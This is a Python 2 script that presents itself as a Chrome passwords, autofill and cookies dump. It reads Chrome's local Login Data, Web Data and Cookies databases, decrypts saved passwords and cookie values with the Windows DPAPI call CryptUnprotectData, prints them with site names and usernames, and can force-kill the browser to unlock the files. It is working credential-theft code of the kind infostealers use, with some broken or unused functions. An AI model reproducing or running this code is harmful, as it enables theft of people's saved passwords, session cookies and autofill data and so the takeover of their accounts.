'''
Created on 17 Feb 2015

@author: John

1. Ensure
'''
from db_test import SQL_query
'''
bb = win32crypt.CryptUnprotectData(u"john",u"psw", None, None, 0)
print str(binascii.hexlify(bb)).upper()


parser = argparse.ArgumentParser(description='Dumps encrypted data.')
parser.add_argument('integers', metavar='N', type=int, nargs='+',help='an integer for the accumulator')
args = parser.parse_args()
print args.accumulate(args.integers)
'''
from os import getenv
import sqlite3
import win32crypt
import sys, os, subprocess, time

class BrowserDataEncrypt(): 
    
    Login_Data_File       = getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data"  # Credentials
    Web_Data_File         = getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data"    # autofill, credit cards  
    Cookies_File          = getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Cookies"     # Cookies
    
    def __init__(self):
        print""" 
            ------------------------------------------------------------------------------------------------    
                Chrome passwords and autofill data and cookies dump
                Created by Dan (Idan) Taler.
                This program uses the Python win32crypt to decrypt current user's information from Chrome.
            ------------------------------------------------------------------------------------------------        
            """
        
    def db_connection(self, Data_File, sql_query):
       
    # Connect to the Database
        try:
            
            con = sqlite3.connect(Data_File)       
            cursor = con.cursor()
        
            self.SQL_query_result = cursor.execute(sql_query)
            
            return self.SQL_query_result
            
        except sqlite3.Error, e:
            print "Error %s:" % e.args[0] 
             
          #  return e.args[0]
            answer = raw_input("-Chrome appears to be working, should we terminate its process? (yes/no) ")
            
            self.terminate_chrome(answer, Data_File, sql_query)
            #if (terminate_answer)           

    def terminate_chrome(self, answer, Data_File, sql_query):
            print sql_query
            print Data_File
            if (answer  ==  'yes'):
                if 'chrome.exe' in subprocess.Popen('tasklist', stdout=subprocess.PIPE).communicate()[0]:
                    subprocess.Popen('taskkill /F /im chrome.exe /T')
                     
                    self.db_connection(Data_File, sql_query)
                    
            elif(answer ==  'no'):
                print 'we cannot dump data while Chrome runs'
               # return 'not_terminated'
            else:
                print 'please select yes or no'  
                

    
    def chrome_passwords(self):
        
        sql_query_passwords   = 'SELECT action_url, username_value, password_value FROM logins'
        SQL_query_result = self.db_connection(self.Login_Data_File, sql_query_passwords)
            
        print '*/*/*/*/*/*/*/*/ Chrome Passwords */*/*/*/*/*/*/*/' 

        for result in SQL_query_result.fetchall():
    
        # Decrypt the Password            
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]        
            if password:
                print '----------------------------------------------------' 
                print 'Site:         '      + result[0]
                print 'Username:     '      + result[1]
                print 'Password:     '      + password         
            else:
                print "No passwords at this point!"
        print '--------------------------------------------------------\n'   
    
    
    #------------Account Service Data------------------- 
    # =================================================     
    def account_service_data(self, sql_query_service_accounts):       
        
        
        #sql_query_service_accounts       = "SELECT service, encrypted_token FROM token_service"
        
        for result in sql_query_service_accounts.fetchall():
            autoFill_accountService = win32crypt.CryptUnprotectData(result[1], None, None, None, 0)[1]
            if autoFill_accountService:
                print 'Account: '   + autoFill_accountService[0]  
                print '2 '          + autoFill_accountService[1]
                print '3  '         + autoFill_accountService
            else:
                print 'No accounts were found!' 
     
               
    #---------Credit Cards------------------------------------
    #===============================================================
    def credit_cards(self, sql_query_creditCards): 
        
       # sql_query_credit_cards           = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified, origin FROM credit_cards"
        
        counter =0
        for result in sql_query_creditCards.fetchall():
            if result:       
                print str(counter)+' {0:50} ==> {1:30}'.format(result[0],result[1])
                counter = counter +1
        

    # -----Autofill Data: 
    # ====================================================     
    def auto_fill(self):       
        
        sql_query_autoFill           = "SELECT name, value FROM autofill"
        SQL_query_result             = self.db_connection(self.Web_Data_File, sql_query_autoFill)
        
        sql_query_autoFill_count     = "SELECT COUNT(name), COUNT(DISTINCT name) FROM autofill"
        SQL_query_result_count       = self.db_connection(self.Web_Data_File, sql_query_autoFill_count)
        
        print "\n-----------------Autofill Data-----------------------"
        #fetch ?
      #  print " Found "+str(SQL_query_result_count[0])+" entries with "+str(SQL_query_result_count[1])+" unique values:  \n \n"
        
    #    print " 222 ->" +    str(SQL_query_result)  
    #    print SQL_query_result
    #    print SQL_query_result_count
        
        counter =0
        for result in SQL_query_result.fetchall():
            if result:       
                print str(counter)+' {0:50} ==> {1:30}'.format(result[0].encode('utf-8'), result[1].encode('utf-8'))
                counter = counter +1
            else:
                print "No autofill entries were found "
 
 
    # -----Cookies: 
    # ====================================================    
    def cookies(self):
        
        sql_query_cookies = "SELECT host_key, encrypted_value FROM cookies"
        SQL_query_result  =  self.db_connection(self.Cookies_File, sql_query_cookies)
        
        print '\n*/*/*/*/*/*/*/*/ Chrome Cookies */*/*/*/*/*/*/*/' 

        counter =0
        for result in SQL_query_result.fetchall():
    
        # Decrypt the Password            
            password = win32crypt.CryptUnprotectData(result[1], None, None, None, 0)[1]        
            if password:
                print '----------------------------------------------------' 
                print str(counter)+' {0:50} ==> {1:30}'.format(result[0].encode('utf-8'), password.encode('utf-8'))   
                counter = counter +1    
            else:
                print "No passwords at this point!"
        print '--------------------------------------------------------\n' 
               
    #---START PROGRAM-----

def main():
   
    #create new class      
    A_class = BrowserDataEncrypt() 
    
    #passwords
    A_class.chrome_passwords()
    
    #before proceed, detect if chrome processes are running
    
    #Auto Fill
    A_class.auto_fill()
    
    #Cookies
    A_class.cookies()
    
#close DB connection - finally
       # finally:
       #     if con1:
       #         con1.close()
if __name__ == '__main__':
    main()
     